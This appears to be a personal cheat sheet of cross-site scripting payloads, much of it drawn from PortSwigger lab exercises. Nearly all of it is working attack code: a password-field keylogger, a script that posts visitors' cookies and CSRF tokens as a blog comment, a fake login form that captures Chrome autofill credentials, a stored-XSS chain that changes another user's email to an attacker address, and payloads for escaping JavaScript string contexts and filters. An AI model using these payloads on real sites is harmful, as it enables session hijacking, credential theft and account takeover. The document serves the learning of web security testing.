
```html
"><h1>test</h1>
```

```html
'+alert(1)+
'```

```html
"onmouseover="alert(1)
```

```html
http://"onmouseover="alert(1)
```  
___
Keylogger

```javascript
t=""; $('input[type="password"]').onkeypress = function (e) { t+=e.key; console.log(t); localStorage.setItem("pw", t); } 
```
___

Fetch users' cookies and post them on a blogpost (PortSwigger)
```html
<script>
document.body.onload = function() {
    // GET COOKIES
    var cookies = document.cookie;
    // GET CSRF TOKEN FROM HTML
    var csrf = document.getElementsByName("csrf")[0].defaultValue;
    // GET DOMAIN
    var domain = document.domain;
    // STORE VALUES NEEDED TO POST THE SCRIPT
    var details = {
        'csrf': csrf,
        'postId': 2,
        'comment': cookies,
        'name': 'victim',
        'email': 'victim@victim',
        'website': 'http://hack'
    };
    // PREPARE AN EMPTY ARRAY WHICH WILL BE FILLED WITH ENCODED VALUES FROM details
    var formBody = [];
    // ENCODED IN TURN EACH KEY/VALUE PAIR FROM DICTIONARY details
    for (var property in details) {
        var encodedKey = encodeURIComponent(property);
        var encodedValue = encodeURIComponent(details[property]);
        // ADD EACH PAIR TO THE ARRAY AND "JOIN" KEYS AND VALUES IN A STRING CONCATENATION
        formBody.push(encodedKey + "=" + encodedValue);
    }
    // CONCAT ARRAY VALUES WITH & CHAR
    formBody = formBody.join("&");
    // POST THE COMMENT
    fetch("https://"+domain+"/post/comment", {
        method: "POST",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: formBody
    });
}
</script>
```
___

Capture autofill credentials (chrome) (PortSwigger XSS Lab)

```html
<section>
    <form class=login-form method=POST action=/login>
        <label>Username</label>
            <input required type=username name="username" id="user2hack">
        <label>Password</label>
            <input required type=password name="password" id="psw2hack">
            <button class=button type=submit> Log in </button>
    </form>
</section>


<script>
// FUNCTION TO GRAB USERNAME AND PASSWORD INPUT FIELDS VALUES
function grabUserPsw(){
    var username = document.getElementById("user2hack").value;
    var password = document.getElementById("psw2hack").value;
// RETURN VALUES AS ARRAY
    return [username, password]
};

// FUNCTION TO POST CREDENTIALS AS COMMENT ON ANOTHER PAGE postId=2
function postCreds(){
// EXECUTE grabUserPsw FUNCTION
    var creds = grabUserPsw();
    var username = creds[0];
    var password = creds[1];
    var credentials = "username:" + username + " - password:" + password;
    var domain = document.domain;
    var csrf = document.getElementsByName("csrf")[0].defaultValue;
    var details = {
        "csrf" : csrf,
        "postId" : 2,
        "comment" : credentials,
        "name" : "victim",
        "email" : "test@test.test",
        "website" : "http://victim"
    };
// PREPARE FORMDATA ARRAY WITH URL ENCODED VALUES AND CONCAT THEM BY CHAR '&'
    formBody = [];
    for (property in details){
        var encodedKey = encodeURIComponent(property);
        var encodedValue = encodeURIComponent(details[property]);
        formBody.push(encodedKey + "=" + encodedValue)
    };
    formBody = formBody.join("&");

    fetch("https://"+domain+"/post/comment", {
        method : "POST",
        headers : {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body : formBody
    });
};
// WAIT FOT DOM DOCUMENT TO BE LOADED AND ATTACH 'onChange' EVENT TO THE PASSWORD INPUT FIELD
// CHROME AUTOFILL TAKES EFFECT ONLY AFTER A USER INTERACTION IN THE WINDOW (CLICK, KEYPRESS...)
document.body.onload = function(e){
    document.getElementById("psw2hack").addEventListener("change", function(e){
        postCreds();
    });
// FORCE MOUSE CLICK ON USERNAME INPUT FIELD TO TRIGGER THE LISTENER ABOVE
    document.getElementById("user2hack").click()
}
</script>
```

_______

Perform a Cross-Site Request Forgery attacks via Stored XSS to change email fo another user (PortSwigger Lab)

```html
    <script>
    function parseText(text){
        // PREPARE PATTERN FOR CSRF TOKEN EXTRACTION
        const re = new RegExp(/value="([A-Z,a-z,0-9]+)"/);
        // LOOK FOR CSRF TOKEN
        const csrfArray = re.exec(text);
        var csrf = csrfArray[1];
        return csrf
    };

    function grabCsrf(url){
        // MAKE HTTP GET REQUEST FOR MYACCOUNT_URL
        req = new XMLHttpRequest;
        req.open("GET", url, false);
        req.send();
        const text = req.responseText;
        // PASS THE TEXT OUTPUT OF THE BODY TO THE parseText() FUNCTION
        csrf = parseText(text);
        return csrf
    };

    function changeEmail(){
        // VARIABLES DECLARATION
        var domain = document.domain;
        var domain_url = 'https://'+domain;
        var changeEmail_url = domain_url + '/my-account/change-email';
        var myAccount_url = domain_url + '/my-account';

        // GRAB AND STORE THE CSRF TOKEN
        const csrf = grabCsrf(myAccount_url)

        // CREATE VARIABLES TO SEND ALONG THE REQUEST TO CHANGE EMAIL
        var params = {
            'email' : 'youvebeenhacked@attacker.hack',
            'csrf' : csrf
        };

        var formBody = [];
        // URL ENCODING
        for (property in params) {
            var encodedKey = encodeURIComponent(property);
            var encodedValue = encodeURIComponent(params[property]);
            formBody.push(encodedKey + "=" + encodedValue)
        };
        formBody = formBody.join("&");

        fetch(changeEmail_url, {
            method : 'POST',
            headers : {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body : formBody
        });
    };

document.body.onload = changeEmail()
</script>
```

_____

**Javascript context**  

No filter on user input. Close the script and cause error with non-existant filename to trigger onerror event.

```html
<script>
var searchTerms = '</script><img src=1 onerror=alert(document.domain)>';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Angle brackets HTML-encoded on user input. Close the string using a single quote, call the event and comment out the rest OR insert the event between single quotes to restore the syntax.

```html
<script>
    var searchTerms = '';alert(1)//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
```html
<script>
    var searchTerms = ''-alert(document.domain)-'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Angle brackets and double quotes HTML-encoded and single quotes escaped.  
Backslash added to escape the single quote is not escaped so adding a backslash in the payload does work because escapes the filter backslash.  
In this way the single quote is not escaped and can be used to close the input string. Comment out the rest.

```html
<script>
    var searchTerms = '\\';alert(document.domain)//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```